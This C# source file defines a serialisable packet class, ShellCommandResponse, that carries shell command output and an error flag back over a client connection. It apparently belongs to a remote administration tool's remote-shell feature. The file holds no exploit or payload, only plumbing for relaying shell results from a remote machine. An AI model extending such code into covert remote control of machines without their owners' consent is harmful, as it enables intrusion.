using ProtoBuf;

namespace xServer.Core.Packets.ClientPackets
{
    [ProtoContract]
    public class ShellCommandResponse : IPacket
    {
        [ProtoMember(1)]
        public string Output { get; set; }

        [ProtoMember(2)]
        public bool IsError { get; private set; }

        public ShellCommandResponse()
        {
        }

        public ShellCommandResponse(string output, bool isError = false)
        {
            this.Output = output;
            this.IsError = isError;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}